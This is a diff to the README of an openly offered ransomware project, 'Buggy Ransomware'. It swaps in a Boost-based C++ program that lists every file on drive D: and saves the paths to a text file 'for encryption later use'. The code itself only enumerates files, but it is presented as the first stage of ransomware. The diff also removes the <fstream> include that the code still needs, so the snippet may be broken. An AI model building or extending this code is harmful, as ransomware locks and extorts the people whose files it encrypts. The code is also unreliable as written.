@@ -11,47 +11,30 @@ Buggy Ransomware is open source  Crypto-Locker. Buggy Ransomware is developed in
 
 Getting all files from all drive to encrypting them.
 
-Here is basic program get all list directory & folder.
+Here is Visual C++ program get all list directory & files in drive and store path in text file for encryption later use.
 
 ```
+#include <boost/config/warning_disable.hpp>
+#include <boost/filesystem.hpp>
 #include <iostream>
-#include <stdio.h>
-#include <string>
-#include <dirent.h>
-#include <fstream>
+#include <iterator>
 
 using namespace std;
 
 fstream data_file("data.txt", ios::out);
 
-int main(void)
-{
+int main(int argc, char* argv[]) {
+	boost::system::error_code dir_error;
 
-	struct dirent *de;  // Pointer for directory entr
-						// opendir() returns a pointer of DIR type. 
-	DIR *dr = opendir("d:\\");
-
-	if (dr == NULL)  // opendir returns NULL if couldn't open directory
-	{
-		printf("Could not open current directory");
-		return 0;
+	for (boost::filesystem::recursive_directory_iterator end, dir("d:\\", dir_error); dir != end; dir.increment(dir_error)) {
+		if (dir_error.value()) {
+			cerr << "Error accessing file: " << dir_error.message() << endl;
+		}
+		else {
+			cout << dir->path() << endl;
+			data_file << dir->path() << "\n";
+		}
 	}
-
-	// for readdir()
-	while ((de = readdir(dr)) != NULL) {
-		//	printf("%s\n", de->d_name);
-		data_file << de->d_name << "\n";
-	}
-	data_file.close();
-	closedir(dr);
-
-	data_file.open("data.txt", ios::in);
-	string line;
-	while (data_file.good()) {
-		getline(data_file, line);
-		cout << line << endl;
-	}
-
 	system("pause");
 	return 0;
 }
